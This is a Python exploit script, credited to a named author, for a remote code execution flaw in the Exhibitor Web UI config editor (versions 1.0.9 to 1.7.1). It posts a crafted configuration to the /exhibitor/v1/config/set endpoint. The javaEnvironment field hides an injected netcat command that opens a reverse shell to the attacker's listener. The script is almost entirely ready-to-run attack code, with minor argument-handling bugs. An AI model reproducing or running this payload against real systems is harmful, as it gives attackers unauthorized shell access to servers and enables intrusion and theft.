# Critical RCE vulnerability in the Config editor of the Exhibitor Web UI versions 1.0.9 to 1.7.1.
# Made by @VanTekken

import requests
import argparse

def main():
    # Change to the IP and Port of your listener e.g. nc -nvlp 1337
    LHOST = '192.168.49.176'
    LPORT = '1337'

    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--port', default=8080, help='Exhibitor Web UI Target Port')
    parser.add_argument('host', default=8080, help='Target Host')
    args = parser.parse_args()

    print("[+] Make sure you have started a listener and specified a listener address within this script.")

    try:
        port = args.p
    except:
        print("[+] No port specified, using default target port of 8080")
        port = "8080"

    data = '{"zookeeperInstallDirectory":"/opt/zookeeper","zookeeperDataDirectory":"/zookeeper/data","zookeeperLogDirectory":"","logIndexDirectory":"","autoManageInstancesSettlingPeriodMs":"10000","autoManageInstancesFixedEnsembleSize":"0","autoManageInstancesApplyAllAtOnce":"1","observerThreshold":"3","serversSpec":"1:pelican","javaEnvironment":"export JAVA_OPTS=\'-Xms1000m -Xmx1000m\' $(/bin/nc -e /bin/sh ' + LHOST + ' 1337 &)","log4jProperties":"","clientPort":"2181","connectPort":"2888","electionPort":"3888","checkMs":"2000","cleanupPeriodMs":"200000","cleanupMaxFiles":"10","backupPeriodMs":"60000","backupMaxStoreMs":"86400000","autoManageInstances":"1","zooCfgExtra":{"syncLimit":"5","tickTime":"2000","initLimit":"10"},"backupExtra":{},"serverId":1}'

    headers = {'Content-Type': 'application/json','X-Requested-With':'XMLHttpRequest'}

    requests.post(args.host + ":" + port + "/exhibitor/v1/config/set", data=data, headers=headers)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[+] Quitting...")